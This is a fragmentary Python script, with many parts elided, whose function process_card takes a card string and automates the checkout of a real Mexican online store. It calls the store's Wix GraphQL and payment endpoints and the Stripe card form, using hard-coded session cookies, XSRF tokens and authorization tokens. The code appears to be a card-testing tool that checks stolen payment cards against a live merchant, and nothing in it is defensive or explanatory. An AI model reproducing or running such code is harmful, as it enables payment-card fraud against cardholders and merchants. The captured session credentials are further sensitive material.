...
async def process_card(card: str) -> str:    
    ...
    while retry_count < max_retries:
        try:
            ...
            headers = {
                'Referer': 'https://www.mimovil.com.mx/_partials/wix-thunderbolt/dist/clientWorker.843bcea4.bundle.min.js',
                'X-XSRF-TOKEN': '1756418433|seHFplLhKy9L',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'Authorization': 'i4IU9USin8Uym2qTvZ3iyxikPW3qIbcD-M5rbWIO064.',
            ...
            params = {
                'query': 'query getCheckoutSettings{checkoutSettings{delayCaptureEnabled taxOnProduct termsAndConditions{value enabled}privacyPolicy{value enabled}digitalItemPolicy{value enabled}refundCancellationPolicy{value enabled}contactUs{value enabled}customPolicy{value enabled title}checkoutPolicyCheckbox{checked show}checkoutSubscriptionCheckbox{checked show}checkoutGiftCardCheckbox{show supported}}}',
                'variables': '{}',
                'operationName': 'getCheckoutSettings',
            }

            response = c.get('https://www.mimovil.com.mx/_api/wixstores-graphql-server/graphql', params=params, headers=headers)
            ...
            headers = {
                ...
                'commonconfig': '%7B%22brand%22%3A%22wix%22%2C%22host%22%3A%22VIEWER%22%2C%22BSI%22%3A%2232d3da1f-21b1-431e-8890-ed2c94094256%7C7%22%2C%22siteRevision%22%3A%223371%22%2C%22renderingFlow%22%3A%22NONE%22%2C%22language%22%3A%22es%22%2C%22locale%22%3A%22es-mx%22%7D',
                # 'cookie': 'server-session-bind=caddff17-1cc4-41d5-a9e3-29dd27bf8a6d; _hjSessionUser_6502453=eyJpZCI6IjA3MWI3YTY5LWQ1M2MtNTJmNi05Zjc4LTgzZjg4ZjE0OGVlZiIsImNyZWF0ZWQiOjE3NTY0MTg0MzMzNTQsImV4aXN0aW5nIjp0cnVlfQ==; XSRF-TOKEN=1756418433|seHFplLhKy9L; hs=-1207678198; svSession=; _fbp=fb.2.1756418434032.224390804231757841; _ga_24GFQT7WYN=GS2.1.s1756418434$o1$g0$t1756418434$j60$l0$h28569319; _ga=GA1.1.946599905.1756418435; _hjSession_6502453=eyJpZCI6IjAyYWI4ZTRlLWM2YjUtNDYxZC1hMDI2LWY4NjVhZWE4YWIxMCIsImMiOjE3NTY0Mjc1NzcyOTMsInMiOjEsInIiOjEsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MH0=; bSession=32d3da1f-21b1-431e-8890-ed2c94094256|7',
                'pragma': 'no-cache',
                'referer': 'https://www.mimovil.com.mx/checkout?appSectionParams=%7B%22a11y%22%3Atrue%2C%22storeUrl%22%3A%22https%3A%2F%2Fwww.mimovil.com.mx%22%2C%22isPickupFlow%22%3Afalse%2C%22cashierPaymentId%22%3A%22%22%2C%22origin%22%3A%22productPage%22%2C%22originType%22%3A%22buyNow%22%2C%22checkoutId%22%3A%2240fbab21-ee54-311a-9c57-984f1762c811%22%7D',
                ...
                'x-wix-linguist': 'es|es|true|1602f4ba-306f-4fe3-bb25-71f11f906c14',
                'x-xsrf-token': '1756418433|seHFplLhKy9L',
            }
            ...
            response = c.get(
                'https://www.mimovil.com.mx/_api/payment-services-web/payments/v2/accounts/1380b703-ce81-ff05-f115-39571d94dfcd:2b1a96d8-a9e2-4409-af21-6e2d71c2d33e/payment-methods',
                params=params,
                headers=headers,
            )
            headers = {
                        ...
                        'checkout': {
                            ...
                            'shippingInfo': {
                                'shippingDestination': {
                                    ...
                                    'address': {
                                        'country': 'MX',
                                        'city': 'Tekax de Álvaro Obregón',
                                        'subdivision': 'MX-YUC',
                                        'postalCode': '97970',
                                        'addressLine': 'Calle 39 & Calle 38',
                                    },
                                },
                            },
                        },
            ...
            headers = {
                ...
                'Pragma': 'no-cache',
                'Referer': 'https://cashier-pci.wixapps.net/card-form?locale=es&providerId=com.stripe&parentOrigin=https%3A%2F%2Fwww.mimovil.com.mx&startLoadTime=1756431345409&msid=c4f305dc-8f15-40ce-9f41-93e5fff88546&visitorId=9dfab7da-2ac2-4f62-af40-c1bd9be4a02c&siteOwnerId=909a67d1-76dd-46b7-b2ba-d53d1b16f2f6&theme=minimal',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'X-Wix-Client-Artifact-Id': 'payments-cc-form',
                'authorization': 'a1u-yiMdP1l9_q3JDqMqyv1tuf_7c4z___ipDuNM1gQ.',
                'commonconfig': '%7B%22brand%22%3A%22wix%22%2C%22host%22%3A%22VIEWER%22%2C%22BSI%22%3A%2232d3da1f-21b1-431e-8890-ed2c94094256%7C9%22%2C%22siteRevision%22%3A%223371%22%2C%22renderingFlow%22%3A%22NONE%22%2C%22language%22%3A%22es%22%2C%22locale%22%3A%22es-mx%22%7D',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'x-wix-brand': 'wix',
            ...
            headers = {
                ...
                'commonconfig': '%7B%22brand%22%3A%22wix%22%2C%22host%22%3A%22VIEWER%22%2C%22BSI%22%3A%2232d3da1f-21b1-431e-8890-ed2c94094256%7C9%22%2C%22siteRevision%22%3A%223371%22%2C%22renderingFlow%22%3A%22NONE%22%2C%22language%22%3A%22es%22%2C%22locale%22%3A%22es-mx%22%7D',
                'content-type': 'application/json',
                # 'cookie': 'server-session-bind=caddff17-1cc4-41d5-a9e3-29dd27bf8a6d; _hjSessionUser_6502453=eyJpZCI6IjA3MWI3YTY5LWQ1M2MtNTJmNi05Zjc4LTgzZjg4ZjE0OGVlZiIsImNyZWF0ZWQiOjE3NTY0MTg0MzMzNTQsImV4aXN0aW5nIjp0cnVlfQ==; XSRF-TOKEN=1756418433|seHFplLhKy9L; hs=-1207678198; svSession=; _fbp=fb.2.1756418434032.224390804231757841; _ga_24GFQT7WYN=GS2.1.s1756418434$o1$g0$t1756418434$j60$l0$h28569319; _ga=GA1.1.946599905.1756418435; _hjSession_6502453=eyJpZCI6IjAyYWI4ZTRlLWM2YjUtNDYxZC1hMDI2LWY4NjVhZWE4YWIxMCIsImMiOjE3NTY0Mjc1NzcyOTMsInMiOjEsInIiOjEsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MH0=; bSession=32d3da1f-21b1-431e-8890-ed2c94094256|9',
            ...
            json_data = {
                'details': {
                    ...
                    'buyerInfo': {
                        'buyerId': '9dfab7da-2ac2-4f62-af40-c1bd9be4a02c',
                        'buyerLanguage': 'es',
                    },
                    'clientInfo': {
            ...
            json_data = {
                ...
                'variables': {
                    'input': {
                        ...
                        'delayCapture': False,
                        'urlParams': {
                            'errorUrl': 'https://www.mimovil.com.mx/checkout?appSectionParams=%7B%22a11y%22%3Atrue%2C%22storeUrl%22%3A%22https%3A%2F%2Fwww.mimovil.com.mx%22%2C%22isPickupFlow%22%3Afalse%2C%22cashierPaymentId%22%3A%22%22%2C%22origin%22%3A%22productPage%22%2C%22originType%22%3A%22buyNow%22%2C%22checkoutId%22%3A%2240fbab21-ee54-311a-9c57-984f1762c811%22%7D&redirect=error',
